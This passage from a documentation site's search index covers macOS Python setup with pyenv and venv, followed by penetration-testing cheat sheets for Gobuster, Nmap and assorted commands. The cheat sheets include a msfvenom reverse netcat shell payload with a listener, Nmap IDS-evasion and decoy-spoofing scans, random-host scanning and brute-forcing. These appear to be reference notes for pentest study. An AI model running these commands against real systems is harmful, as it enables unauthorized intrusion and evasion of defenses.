them. If they aren't and you are using the same zsh or bash config it will ignore loading them Third is a fix for brew, brew doctor . When using this method it may conflict with brew as it uses python as well. If you run run brew doctor without the fix, it will show config warnings related to the python configuration files. Configuration for ~/.zshrc or ~/.zprofile # Executable Paths ## Global export PATH=\"/usr/local/bin:/usr/local/sbin:/Users/${USER}/.local/bin:/usr/bin:/usr/sbin:/bin:/sbin:$PATH\" ## Curl export PATH=\"/opt/homebrew/opt/curl/bin:$PATH\" export LDFLAGS=\"-L/opt/homebrew/opt/curl/lib\" export CPPFLAGS=\"-I/opt/homebrew/opt/curl/include\" export PKG_CONFIG_PATH=\"/opt/homebrew/opt/curl/lib/pkgconfig\" # pyenv, pyenv-virtualenv ## Initiating pyenv and fix Brew Doctor: \"Warning: \"config\" scripts exist outside your system or Homebrew directories\" if which pyenv >/dev/null; then eval \"$(pyenv init --path)\" alias brew='env PATH=${PATH//$(pyenv root)\\/shims:/} brew' fi ## Initiating pyenv-virtualenv if which pyenv-virtualenv-init >/dev/null; then eval \"$(pyenv virtualenv-init -)\" fi After you saved your configuration the best way to load it is to close your terminal session and open it again. This will load the session with your updated configuration. There should be no errors at the new session. This will install both pyenv and pyenv-virtualenv brew install pyenv-virtualenv Test if pyenv loaded currently pyenv - v After the installation we would like to set a system level python version, you can chose the default from the list available from the pyenv List available Python Version and find the version suited for your needs: pyenv install -- list Install Requeued Python Version (Exmaple version 3.9.5) as a default system pyenv install 3.9.5 Set it as global pyenv global 3.9.5 You can install multiply versions of python at the same time. List all installed python versions and virtual environments and their python versions pyenv versions Now let's test our system Python version we set before, it should be the version you choose as Global before python -V So far we cleaned your system and installed and configured pyenv, pyenv-virtualenv. How to use pyenv-virtualenv \u00b6 Now let's understand how to use Python Virtual Environment with pyenv-virtualenv Full documentation can be found at the original repo at git hub: pyenv-virtualenv github We will list here some basic examples for a quick start and basic understanding To create a virtualenv for the Python version used with pyenv, run pyenv virtualenv, specifying the Python version you want and the name of the virtualenv directory. For example, pyenv virtualenv 3.9.5 my - project - name This will create a virtualenv based on Python 3.9.5 under $(pyenv root)/versions in a folder called my-project-name Activating virtualenv automatically for project The best way we found to activate the virtualenv at your project is to link the projects directory to the virtualenv. cd to the project's directory and link the virtualenv for example my-project-name virtualenv pyenv local my - project - name This will activate the linked virtualenv every time you cd to this directory automatically From now you can use pip to install any packages you need for your project, the location of the installed packages will be at $(pyenv root)/versions/ Activating virtualenv manually for project You can also activate and deactivate a pyenv virtualenv manually: pyenv activate < virtualenv name > pyenv deactivate This will alow you to use multiply versions of python or packages for the same project List existing virtualenvs pyenv virtualenvs Delete existing virtualenv pyenv uninstall my - virtual - env or pyenv virtualenv - delete my - virtual - env You and your macOS should be ready for using python the right way without conflicting any system or Xcode Command Line Tools (used by brew)", "title": "Pyenv-virtualenv Multi Version"}, {"location": "mac-os/python/pyenv-virtualenv/#pyenv-virtualenv-multiple-version-python-virtual-environment-manager", "text": "", "title": "Pyenv-virtualenv - Multiple Version Python Virtual Environment Manager"}, {"location": "mac-os/python/pyenv-virtualenv/#intro", "text": "Using and developing with Python on macOS sometimes may be frustrating... The reason for that is that macOS uses Python 2 for its core system with pip as a package manager. When Xcode Command Line Tools are installed Python 3 and pip3 package manager will be available at the cli. When using Python2, Python3 and their package managers this way, all the packages will be installed at the system level and my effect the native packages and their dependences , this can break or lead to unwanted bugs in OS. The right way to use python at macOS is to use Virtual Environments for python. This way all the system related versions of python and their packages won't be affected and use by you.", "title": "Intro"}, {"location": "mac-os/python/pyenv-virtualenv/#installing-and-configuring-pyenv-pyenv-virtualenv", "text": "In order to use pyenv, pyenv-virtualenv without conflicting with the native macOS python we need to add some configuration to our ~/.zshrc config (for mac os catalina) or your bash config if you are still using bash. It's very imported to maintain the order of the configuration for the loading order First of all we need to include your Executable Paths. In the example we added all the common paths, including the paths for pyenv, pyenv-virtualenv. If you have any other path that you use, you can add them at the same line or create a new line below this one. Second to Executable Paths we will add two if statements that will check if the pyenv,pyenv-virtualenv are installed, if they are it will load them. If they aren't and you are using the same zsh or bash config it will ignore loading them Third is a fix for brew, brew doctor . When using this method it may conflict with brew as it uses python as well. If you run run brew doctor without the fix, it will show config warnings related to the python configuration files. Configuration for ~/.zshrc or ~/.zprofile # Executable Paths ## Global export PATH=\"/usr/local/bin:/usr/local/sbin:/Users/${USER}/.local/bin:/usr/bin:/usr/sbin:/bin:/sbin:$PATH\" ## Curl export PATH=\"/opt/homebrew/opt/curl/bin:$PATH\" export LDFLAGS=\"-L/opt/homebrew/opt/curl/lib\" export CPPFLAGS=\"-I/opt/homebrew/opt/curl/include\" export PKG_CONFIG_PATH=\"/opt/homebrew/opt/curl/lib/pkgconfig\" # pyenv, pyenv-virtualenv ## Initiating pyenv and fix Brew Doctor: \"Warning: \"config\" scripts exist outside your system or Homebrew directories\" if which pyenv >/dev/null; then eval \"$(pyenv init --path)\" alias brew='env PATH=${PATH//$(pyenv root)\\/shims:/} brew' fi ## Initiating pyenv-virtualenv if which pyenv-virtualenv-init >/dev/null; then eval \"$(pyenv virtualenv-init -)\" fi After you saved your configuration the best way to load it is to close your terminal session and open it again. This will load the session with your updated configuration. There should be no errors at the new session. This will install both pyenv and pyenv-virtualenv brew install pyenv-virtualenv Test if pyenv loaded currently pyenv - v After the installation we would like to set a system level python version, you can chose the default from the list available from the pyenv List available Python Version and find the version suited for your needs: pyenv install -- list Install Requeued Python Version (Exmaple version 3.9.5) as a default system pyenv install 3.9.5 Set it as global pyenv global 3.9.5 You can install multiply versions of python at the same time. List all installed python versions and virtual environments and their python versions pyenv versions Now let's test our system Python version we set before, it should be the version you choose as Global before python -V So far we cleaned your system and installed and configured pyenv, pyenv-virtualenv.", "title": "Installing and configuring pyenv, pyenv-virtualenv"}, {"location": "mac-os/python/pyenv-virtualenv/#how-to-use-pyenv-virtualenv", "text": "Now let's understand how to use Python Virtual Environment with pyenv-virtualenv Full documentation can be found at the original repo at git hub: pyenv-virtualenv github We will list here some basic examples for a quick start and basic understanding To create a virtualenv for the Python version used with pyenv, run pyenv virtualenv, specifying the Python version you want and the name of the virtualenv directory. For example, pyenv virtualenv 3.9.5 my - project - name This will create a virtualenv based on Python 3.9.5 under $(pyenv root)/versions in a folder called my-project-name Activating virtualenv automatically for project The best way we found to activate the virtualenv at your project is to link the projects directory to the virtualenv. cd to the project's directory and link the virtualenv for example my-project-name virtualenv pyenv local my - project - name This will activate the linked virtualenv every time you cd to this directory automatically From now you can use pip to install any packages you need for your project, the location of the installed packages will be at $(pyenv root)/versions/ Activating virtualenv manually for project You can also activate and deactivate a pyenv virtualenv manually: pyenv activate < virtualenv name > pyenv deactivate This will alow you to use multiply versions of python or packages for the same project List existing virtualenvs pyenv virtualenvs Delete existing virtualenv pyenv uninstall my - virtual - env or pyenv virtualenv - delete my - virtual - env You and your macOS should be ready for using python the right way without conflicting any system or Xcode Command Line Tools (used by brew)", "title": "How to use pyenv-virtualenv"}, {"location": "mac-os/python/virtual-environment/", "tags": ["MacOS", "Python"], "text": "Python Virtual Environment \u00b6 Usage of a native Python virtual environment in macOS with venv The venv module provides support for creating lightweight \u201cvirtual environments\u201d with their own site directories, optionally isolated from system site directories. Each virtual environment has its own Python binary (which matches the version of the binary that was used to create this environment) and can have its own independent set of installed Python packages in its site directories. Initialization of a Virtual Environment \u00b6 Go to the root destination of your project and run the following command: python3 -m venv .venv This will create a virtual environment in the current directory. The virtual environment folder will be named .venv . Activation of a Virtual Environment \u00b6 In order to activate a virtual environment, from the root directory of your project, run the following command: source .venv/bin/activate Check if the virtual environment is activated by running the following command: which python The output should be with ../.venv/bin/python as the output. Bonus: You can add an alias to your bash profile to make it easier to activate the virtual environment: alias activate = 'source .venv/bin/activate' Deactivation of a Virtual Environment \u00b6 When you are done with the virtual environment, you can deactivate it by running the following command: deactivate", "title": "Virtual Environment"}, {"location": "mac-os/python/virtual-environment/#python-virtual-environment", "text": "Usage of a native Python virtual environment in macOS with venv The venv module provides support for creating lightweight \u201cvirtual environments\u201d with their own site directories, optionally isolated from system site directories. Each virtual environment has its own Python binary (which matches the version of the binary that was used to create this environment) and can have its own independent set of installed Python packages in its site directories.", "title": "Python Virtual Environment"}, {"location": "mac-os/python/virtual-environment/#initialization-of-a-virtual-environment", "text": "Go to the root destination of your project and run the following command: python3 -m venv .venv This will create a virtual environment in the current directory. The virtual environment folder will be named .venv .", "title": "Initialization of a Virtual Environment"}, {"location": "mac-os/python/virtual-environment/#activation-of-a-virtual-environment", "text": "In order to activate a virtual environment, from the root directory of your project, run the following command: source .venv/bin/activate Check if the virtual environment is activated by running the following command: which python The output should be with ../.venv/bin/python as the output. Bonus: You can add an alias to your bash profile to make it easier to activate the virtual environment: alias activate = 'source .venv/bin/activate'", "title": "Activation of a Virtual Environment"}, {"location": "mac-os/python/virtual-environment/#deactivation-of-a-virtual-environment", "text": "When you are done with the virtual environment, you can deactivate it by running the following command: deactivate", "title": "Deactivation of a Virtual Environment"}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/", "text": "Cli Commands Collation \u00b6 Find PTR Owner - Reversal Look Up \u00b6 dig 0 .168.192.in-addr.arpa. NS Listent for Ping/icmp on interface \u00b6 sudo tcpdump ip proto \\\\ icmp -i eth0 Reverse Netcat Shell \u00b6 Payload R(row) msfvenom -p cmd/unix/reverse_netcat lhost = 10 .11.19.49 lport = 4444 R listener: nc -lvp 4444 NFS Show Mount \u00b6 showmount -e 10 .10.87.232", "title": "Cli Commands Collation"}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#cli-commands-collation", "text": "", "title": "Cli Commands Collation"}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#find-ptr-owner-reversal-look-up", "text": "dig 0 .168.192.in-addr.arpa. NS", "title": "Find PTR Owner - Reversal Look Up"}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#listent-for-pingicmp-on-interface", "text": "sudo tcpdump ip proto \\\\ icmp -i eth0", "title": "Listent for Ping/icmp on interface"}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#reverse-netcat-shell", "text": "Payload R(row) msfvenom -p cmd/unix/reverse_netcat lhost = 10 .11.19.49 lport = 4444 R listener: nc -lvp 4444", "title": "Reverse Netcat Shell"}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#nfs-show-mount", "text": "showmount -e 10 .10.87.232", "title": "NFS Show Mount"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/", "text": "Gobuster CheatSheet \u00b6 Common Gobuster Commands \u00b6 dir Mode \u00b6 gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt With content length gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt -l dns Mode \u00b6 gobuster dns -d example.com -t 50 -w common-names.txt gobuster dns -d example.com-w ~/wordlists/subdomains.txt With Show IP gobuster dns -d example.com -w ~/wordlists/subdomains.txt -i Base domain validation warning when the base domain fails to resolve gobuster dns -d example.com -w ~/wordlists/subdomains.txt -i Wildcard DNS is also detected properly: gobuster dns -d 0 .0.1.xip.io -w ~/wordlists/subdomains.txt vhost Mode \u00b6 gobuster vhost -u https://example.com -w common-vhosts.txt s3 Mode gobuster s3 -w bucket-names.txt Available Modes \u00b6 Switch Description dir the classic directory brute-forcing mode dns DNS subdomain brute-forcing mode s3 Enumerate open S3 buckets and look for existence and bucket listings vhost irtual host brute-forcing mode (not the same as DNS!) Global Flags \u00b6 Short Switch Long Switch Description -z --no-progress Don't display progress -o --output string Output file to write results to (defaults to stdout) -q --quiet Don't print the banner and other noise -t --threads int Number of concurrent threads (default 10) -i --show-ips Show IP addresses --delay duration DNS resolver timeout (default 1s) -v, --verbose Verbose output (errors) -w --wordlist string Path to the wordlist DNS Mode Options \u00b6 Short Switch Long Switch Description -h, --help help for dns -d, --domain string The target domain -r, --resolver string Use custom DNS server (format server.com or server.com:port) -c, --show-cname Show CNAME records (cannot be used with '-i' option) -i, --show-ips Show IP addresses --timeout duration DNS resolver timeout (default 1s) DIR Mode Options \u00b6 Short Switch Long Switch Description -h, --help help for dir -f, --add-slash Append / to each request -c, --cookies string Cookies to use for the requests -e, --expanded Expanded mode, print full URLs -x, --extensions string File extension(s) to search for -r, --follow-redirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -l, --include-length Include the length of the body in the output -k, --no-tls-validation Skip TLS certificate verification -n, --no-status Don't print status codes -P, --password string Password for Basic Auth -p, --proxy string Proxy to use for requests [http(s)://host:port] -s, --status-codes string Positive status codes (will be overwritten with status-codes-blacklist if set) (default \"200,204,301,302,307,401,403\") -b, --status-codes-blacklist string Negative status codes (will override status-codes if set) --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U, --username string Username for Basic Auth -d, --discover-backup Upon finding a file search for backup files --wildcard Force continued operation when wildcard found vhost Mode Options \u00b6 Short Switch Long Switch Description -h --help help for vhost -c --cookies string Cookies to use for the requests -r --follow-redirect Follow redirects -H --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -k --no-tls-validation Skip TLS certificate verification -P --password string Password for Basic Auth -p --proxy string Proxy to use for requests [http(s)://host:port] --timeout duration HTTP Timeout (default 10s) -u --url string The target URL -a --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U --username string Username for Basic Auth", "title": "Gobuster CheatSheet"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#gobuster-cheatsheet", "text": "", "title": "Gobuster CheatSheet"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#common-gobuster-commands", "text": "", "title": "Common Gobuster Commands"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dir-mode", "text": "gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt With content length gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt -l", "title": "dir Mode"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dns-mode", "text": "gobuster dns -d example.com -t 50 -w common-names.txt gobuster dns -d example.com-w ~/wordlists/subdomains.txt With Show IP gobuster dns -d example.com -w ~/wordlists/subdomains.txt -i Base domain validation warning when the base domain fails to resolve gobuster dns -d example.com -w ~/wordlists/subdomains.txt -i Wildcard DNS is also detected properly: gobuster dns -d 0 .0.1.xip.io -w ~/wordlists/subdomains.txt", "title": "dns Mode"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#vhost-mode", "text": "gobuster vhost -u https://example.com -w common-vhosts.txt s3 Mode gobuster s3 -w bucket-names.txt", "title": "vhost Mode"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#available-modes", "text": "Switch Description dir the classic directory brute-forcing mode dns DNS subdomain brute-forcing mode s3 Enumerate open S3 buckets and look for existence and bucket listings vhost irtual host brute-forcing mode (not the same as DNS!)", "title": "Available Modes"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#global-flags", "text": "Short Switch Long Switch Description -z --no-progress Don't display progress -o --output string Output file to write results to (defaults to stdout) -q --quiet Don't print the banner and other noise -t --threads int Number of concurrent threads (default 10) -i --show-ips Show IP addresses --delay duration DNS resolver timeout (default 1s) -v, --verbose Verbose output (errors) -w --wordlist string Path to the wordlist", "title": "Global Flags"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dns-mode-options", "text": "Short Switch Long Switch Description -h, --help help for dns -d, --domain string The target domain -r, --resolver string Use custom DNS server (format server.com or server.com:port) -c, --show-cname Show CNAME records (cannot be used with '-i' option) -i, --show-ips Show IP addresses --timeout duration DNS resolver timeout (default 1s)", "title": "DNS Mode Options"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dir-mode-options", "text": "Short Switch Long Switch Description -h, --help help for dir -f, --add-slash Append / to each request -c, --cookies string Cookies to use for the requests -e, --expanded Expanded mode, print full URLs -x, --extensions string File extension(s) to search for -r, --follow-redirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -l, --include-length Include the length of the body in the output -k, --no-tls-validation Skip TLS certificate verification -n, --no-status Don't print status codes -P, --password string Password for Basic Auth -p, --proxy string Proxy to use for requests [http(s)://host:port] -s, --status-codes string Positive status codes (will be overwritten with status-codes-blacklist if set) (default \"200,204,301,302,307,401,403\") -b, --status-codes-blacklist string Negative status codes (will override status-codes if set) --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U, --username string Username for Basic Auth -d, --discover-backup Upon finding a file search for backup files --wildcard Force continued operation when wildcard found", "title": "DIR Mode Options"}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#vhost-mode-options", "text": "Short Switch Long Switch Description -h --help help for vhost -c --cookies string Cookies to use for the requests -r --follow-redirect Follow redirects -H --headers stringArray Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2' -k --no-tls-validation Skip TLS certificate verification -P --password string Password for Basic Auth -p --proxy string Proxy to use for requests [http(s)://host:port] --timeout duration HTTP Timeout (default 10s) -u --url string The target URL -a --useragent string Set the User-Agent string (default \"gobuster/3.1.0\") -U --username string Username for Basic Auth", "title": "vhost Mode Options"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/", "text": "Nmap CheatSheet \u00b6 Common Nmap Commands \u00b6 Aggressive scan, single host, TCP SYN, : nmap -n -sS -p- -T4 -Pn -A -v 192 .168.1.1 Ping Scan - Host discovery in subnet nmap -sn -v 192 .168.0.0/24 Target Specification \u00b6 Switch Description Example nmap 192.168.1.1 Scan a single IP nmap 192.168.1.1 192.168.2.1 Scan specific IPs nmap scanme.nmap.org Scan a range nmap scanme.nmap.org Scan a domain nmap 192.168.1.0/24 Scan using CIDR notation -iL nmap -iL targets.txt Scan targets from a file -iR nmap -iR 100 Scan 100 random hosts --exclude nmap --exclude 192.168.1.1 Exclude listed hosts Scan Techniques \u00b6 Switch Example Description -sS nmap 192.168.1.1 -sS TCP SYN port scan (Default) -sT nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege) -sU nmap 192.168.1.1 -sU UDP port scan -sA nmap 192.168.1.1 -sA TCP ACK port scan -sW nmap 192.168.1.1 -sW TCP Window port scan -sM nmap 192.168.1.1 -sM TCP Maimon port scan Host Discovery \u00b6 Switch Description Example -sL nmap 192.168.1.1-3 -sL No Scan. List targets only -sn nmap 192.168.1.1/24 -sn Disable port scanning. Host discovery only. -Pn nmap 192.168.1.1-5 -Pn Disable host discovery. Port scan only. -PS nmap 192.168.1.1-5 -PS22-25,80 TCP SYN discovery on port x.Port 80 by default -PA nmap 192.168.1.1-5 -PA22-25,80 TCP ACK discovery on port x.Port 80 by default -PU nmap 192.168.1.1-5 -PU53 UDP discovery on port x.Port 40125 by default -PR nmap 192.168.1.1-1/24 -PR ARP discovery on local network -n nmap 192.168.1.1 -n Never do DNS resolution Port Specification \u00b6 Switch Description Example -p nmap 192.168.1.1 -p 21 Port scan for port x -p nmap 192.168.1.1 -p 21-100 Port range -p nmap 192.168.1.1 -p U:53,T:21-25,80 Port scan multiple TCP and UDP ports -p nmap 192.168.1.1 -p- Port scan all ports -p nmap 192.168.1.1 -p http,https Port scan from service name -F nmap 192.168.1.1 -F Fast port scan (100 ports) --top-ports nmap 192.168.1.1 --top-ports 2000 Port scan the top x ports -p-65535 nmap 192.168.1.1 -p-65535 Leaving off initial port in range makes the scan start at port 1 -p0- nmap 192.168.1.1 -p0- Leaving off end port in rangemakes the scan go through to port 65535 Service and Version Detection \u00b6 Switch Description Example -sV nmap 192.168.1.1 -sV Attempts to determine the version of the service running on port -sV --version-intensity nmap 192.168.1.1 -sV --version-intensity 8 Intensity level 0 to 9. Higher number increases possibility of correctness -sV --version-light nmap 192.168.1.1 -sV --version-light Enable light mode. Lower possibility of correctness. Faster -sV --version-all nmap 192.168.1.1 -sV --version-all Enable intensity level 9. Higher possibility of correctness. Slower -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute OS Detection \u00b6 Switch Description Example -O nmap 192.168.1.1 -O Remote OS detection using TCP/IP stack fingerprinting -O --osscan-limit nmap 192.168.1.1 -O --osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host -O --osscan-guess nmap 192.168.1.1 -O --osscan-guess Makes Nmap guess more aggressively -O --max-os-tries nmap 192.168.1.1 -O --max-os-tries 1 Set the maximum number x of OS detection tries against a target -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute Timing and Performance \u00b6 Switch Description Example -T0 nmap 192.168.1.1 -T0 Paranoid (0) Intrusion DetectionSystem evasion -T1 nmap 192.168.1.1 -T1 Sneaky (1) Intrusion Detection Systemevasion -T2 nmap 192.168.1.1 -T2 Polite (2) slows down the scan to useless bandwidth and use less target machine resources -T3 nmap 192.168.1.1 -T3 Normal (3) which is default speed -T4 nmap 192.168.1.1 -T4 Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network -T5 nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network -------- -------- ------------------------------------------------------------------------------------------- --host-timeout 1s; 4m; 2h Give up on target after this long --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout 1s; 4m; 2h Specifies probe round trip time --min-hostgroup/max-hostgroup <size 50; 1024 Parallel host scan group sizes --min-parallelism/max-parallelism 10; 1 Probe parallelization --scan-delay/--max-scan-delay 20ms; 2s; 4m; 5h Adjust delay between probes --max-retries 3 Specify the maximum number of port scan probe retransmissions --min-rate 100 Send packets no slower than per second --max-rate 100 Send packets no faster than per second NSE Scripts \u00b6 Switch Description Example -sC nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe --script default nmap 192.168.1.1 --script default Scan with default NSE scripts. Considered useful for discovery and safe --script nmap 192.168.1.1 --script=banner Scan with a single script. Example banner --script nmap 192.168.1.1 --script=http* Scan with a wildcard. Example http --script nmap 192.168.1.1 --script=http,banner Scan with two scripts. Example http and banner --script nmap 192.168.1.1 --script \"not intrusive\" Scan default, but remove intrusive scripts --script-args nmap --script snmp-sysdescr --script-args snmpcommunity=admin 192.168.1.1 NSE script with arguments Useful NSE Script Examples \u00b6 Command Description nmap -Pn --script=http-sitemap-generator scanme.nmap.org http site map generator nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 1000 Fast search for random web servers nmap -Pn --script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains nmap -n -Pn -vv -O -sV --script smb-enum ,smb-ls,smb-mbenum,smb-os-discovery,smb-s ,smb-vuln ,smbv2 -vv 192.168.1.1 Safe SMB scripts to run nmap --script whois* domain.com Whois query nmap -p80 --script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities nmap -p80 --script http-sql-injection scanme.nmap.org Check for SQL injections Firewall / IDS Evasion and Spoofing \u00b6 Switch Description Example -f nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters --mtu nmap 192.168.1.1 --mtu 32 Set your own offset size -D nmap -D 192.168.1.101,192.168.1.102, 192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs -D nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained -S nmap -S www.microsoft.com www.facebook.com Scan Facebook from Microsoft (-e eth0 -Pn may be required) -g nmap -g 53 192.168.1.1 Use given source port number --proxies nmap --proxies http://192.168.1.1:8080 , http://192.168.1.2:8080 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies --data-length nmap --data-length 200 192.168.1.1 Appends random data to sent packets Example IDS Evasion command \u00b6 nmap -f -t 0 -n -Pn \u2013data-length 200 -D 192 .168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192 .168.1.1 Output \u00b6 Switch Description Example -oN nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file -oX nmap 192.168.1.1 -oX xml.file XML output to the file xml.file -oG nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file -oA nmap 192.168.1.1 -oA results Output in the three major formats at once -oG - nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable --append-output nmap 192.168.1.1 -oN file.file --append-output Append a scan to a previous scan file -v nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect) -d nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect) --reason nmap 192.168.1.1 --reason Display the reason a port is in a particular state, same output as -vv --open nmap 192.168.1.1 --open Only show open (or possibly open) ports --packet-trace nmap 192.168.1.1 -T4 --packet-trace Show all packets sent and received --iflist nmap --iflist Shows the host interfaces and routes --resume nmap --resume results.file Resume a scan Helpful Nmap Output examples \u00b6 Scan for web servers and grep to show which IPs are running web servers nmap -p80 -sV -oG - --open 192 .168.1.1/24 | grep open Generate a list of the IPs of live hosts nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 > live-hosts.txt Append IP to the list of live hosts nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 >> live-hosts.txt Compare output from nmap using the ndif ndiff scanl.xml scan2.xml Convert nmap xml files to html files xsltproc nmap.xml -o nmap.html Reverse sorted list of how often ports turn up grep \" open \" results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less Miscellaneous Options \u00b6 Switch Description Example -6 nmap -6 2607:f0d0:1002:51::4 Enable IPv6 scanning -h nmap -h nmap help screen Other Useful Nmap Commands \u00b6 Discovery only on ports x, no port scan nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn Arp discovery only on local network, no port scan nmap 192 .168.1.1-1/24 -PR -sn -vv Traceroute to random targets, no port scan nmap -iR 10 -sn -traceroute Query the Internal DNS for hosts, list targets only nmap 192 .168.1.1-50 -sL --dns-server 192 .168.1.1", "title": "Nmap CheatSheet"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#nmap-cheatsheet", "text": "", "title": "Nmap CheatSheet"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#common-nmap-commands", "text": "Aggressive scan, single host, TCP SYN, : nmap -n -sS -p- -T4 -Pn -A -v 192 .168.1.1 Ping Scan - Host discovery in subnet nmap -sn -v 192 .168.0.0/24", "title": "Common Nmap Commands"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#target-specification", "text": "Switch Description Example nmap 192.168.1.1 Scan a single IP nmap 192.168.1.1 192.168.2.1 Scan specific IPs nmap scanme.nmap.org Scan a range nmap scanme.nmap.org Scan a domain nmap 192.168.1.0/24 Scan using CIDR notation -iL nmap -iL targets.txt Scan targets from a file -iR nmap -iR 100 Scan 100 random hosts --exclude nmap --exclude 192.168.1.1 Exclude listed hosts", "title": "Target Specification"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#scan-techniques", "text": "Switch Example Description -sS nmap 192.168.1.1 -sS TCP SYN port scan (Default) -sT nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege) -sU nmap 192.168.1.1 -sU UDP port scan -sA nmap 192.168.1.1 -sA TCP ACK port scan -sW nmap 192.168.1.1 -sW TCP Window port scan -sM nmap 192.168.1.1 -sM TCP Maimon port scan", "title": "Scan Techniques"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#host-discovery", "text": "Switch Description Example -sL nmap 192.168.1.1-3 -sL No Scan. List targets only -sn nmap 192.168.1.1/24 -sn Disable port scanning. Host discovery only. -Pn nmap 192.168.1.1-5 -Pn Disable host discovery. Port scan only. -PS nmap 192.168.1.1-5 -PS22-25,80 TCP SYN discovery on port x.Port 80 by default -PA nmap 192.168.1.1-5 -PA22-25,80 TCP ACK discovery on port x.Port 80 by default -PU nmap 192.168.1.1-5 -PU53 UDP discovery on port x.Port 40125 by default -PR nmap 192.168.1.1-1/24 -PR ARP discovery on local network -n nmap 192.168.1.1 -n Never do DNS resolution", "title": "Host Discovery"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#port-specification", "text": "Switch Description Example -p nmap 192.168.1.1 -p 21 Port scan for port x -p nmap 192.168.1.1 -p 21-100 Port range -p nmap 192.168.1.1 -p U:53,T:21-25,80 Port scan multiple TCP and UDP ports -p nmap 192.168.1.1 -p- Port scan all ports -p nmap 192.168.1.1 -p http,https Port scan from service name -F nmap 192.168.1.1 -F Fast port scan (100 ports) --top-ports nmap 192.168.1.1 --top-ports 2000 Port scan the top x ports -p-65535 nmap 192.168.1.1 -p-65535 Leaving off initial port in range makes the scan start at port 1 -p0- nmap 192.168.1.1 -p0- Leaving off end port in rangemakes the scan go through to port 65535", "title": "Port Specification"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#service-and-version-detection", "text": "Switch Description Example -sV nmap 192.168.1.1 -sV Attempts to determine the version of the service running on port -sV --version-intensity nmap 192.168.1.1 -sV --version-intensity 8 Intensity level 0 to 9. Higher number increases possibility of correctness -sV --version-light nmap 192.168.1.1 -sV --version-light Enable light mode. Lower possibility of correctness. Faster -sV --version-all nmap 192.168.1.1 -sV --version-all Enable intensity level 9. Higher possibility of correctness. Slower -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute", "title": "Service and Version Detection"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#os-detection", "text": "Switch Description Example -O nmap 192.168.1.1 -O Remote OS detection using TCP/IP stack fingerprinting -O --osscan-limit nmap 192.168.1.1 -O --osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host -O --osscan-guess nmap 192.168.1.1 -O --osscan-guess Makes Nmap guess more aggressively -O --max-os-tries nmap 192.168.1.1 -O --max-os-tries 1 Set the maximum number x of OS detection tries against a target -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute", "title": "OS Detection"}, {"location": 